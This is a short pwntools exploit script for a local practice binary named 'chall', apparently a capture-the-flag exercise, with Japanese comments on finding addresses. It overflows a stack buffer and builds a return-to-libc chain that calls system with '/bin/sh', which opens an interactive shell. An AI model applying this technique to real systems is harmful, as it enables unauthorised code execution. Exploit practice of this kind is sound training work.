#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")
# elf = ELF("./chall")
# rop = ROP(elf)

system_plt = 0x8048390  # objdump コマンド等で調査する。
exit_plt = 0x80483a0  # objdump コマンド等で調査する。
pop_ebx_addr = 0x08048349  # ropgadget等で調査する。

# system_plt = elf.plt["system"]
# exit_plt = elf.plt["exit"]
# pop_ebx_addr = rop.ebx[0]

# print("[*] system plt addr : 0x{:x}".format(system_plt))
# print("[*] exit plt addr : 0x{:x}".format(exit_plt))
# print("[*] pop ebx addr : 0x{:x}".format(pop_ebx_addr))


_ = target.readuntil("buf1 = ") 
buf1_addr = int(target.readline(), 16)

print("[*] buf addr : 0x{:x}".format(buf1_addr))

_ = target.readline()

payload = b"A" * 42
payload += p32(system_plt)
payload += p32(pop_ebx_addr)
payload += p32(buf1_addr + len(payload) + 13)
payload += p32(exit_plt)
payload += b"BBBB"
payload += b"\x00"
payload += b"/bin/sh\x00"

target.sendline(payload)

target.interactive()
